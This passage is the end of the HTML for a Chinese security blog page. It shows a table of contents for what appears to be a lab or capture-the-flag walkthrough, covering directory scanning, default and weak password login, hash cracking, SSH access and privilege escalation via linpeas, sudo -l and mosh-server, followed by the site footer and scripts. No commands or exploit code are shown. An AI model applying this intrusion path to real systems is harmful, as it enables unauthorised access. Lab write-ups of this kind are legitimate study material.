class="toc-article-text">扫目录2（成功，确定登录点）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%99%BB%E5%BD%95"><span class="toc-article-text">弱口令登录</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">默认密码登录（失败）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">弱口令爆破（失败）</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AF%BB%E6%89%BE%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-article-text">寻找新攻击面</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%96%B0%E5%85%A5%E5%8F%A3"><span class="toc-article-text">新入口</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-article-text">默认密码登录（成功）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%91%E7%8E%B0%E6%96%B0%E7%94%A8%E6%88%B7"><span class="toc-article-text">发现新用户</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81hash"><span class="toc-article-text">爆破密码hash</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95ssh%E7%99%BB%E5%BD%95%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-article-text">尝试ssh登录（成功）</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-article-text">提权</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#linpeas"><span class="toc-article-text">linpeas</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#sudo-l"><span class="toc-article-text">sudo -l</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#mosh-server"><span class="toc-article-text">mosh-server</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%A0%94%E7%A9%B6"><span class="toc-article-text">研究</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-article-text">利用</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 X1NRI's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
